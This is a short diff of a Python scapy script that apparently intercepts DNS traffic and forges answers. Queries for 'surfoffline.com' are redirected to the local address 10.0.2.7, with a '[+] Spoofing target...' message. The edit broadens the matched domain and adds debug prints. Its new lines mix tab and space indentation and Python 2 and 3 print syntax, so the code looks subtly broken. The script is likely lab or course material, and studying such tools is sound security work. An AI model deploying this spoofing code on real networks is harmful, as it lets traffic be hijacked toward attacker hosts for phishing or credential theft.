@@ -13,9 +13,10 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     #print(scapy_packet.show())
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
-        qname = scapy_packet[scapy.DNSQR].qname
-        if "www.surfoffline.com" in qname:
+        #print(scapy_packet.show())
+	qname = scapy_packet[scapy.DNSQR].qname
+	print qname
+        if "surfoffline.com" in qname:
             print(scapy_packet.show())
             print("[+] Spoofing target...")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.7")
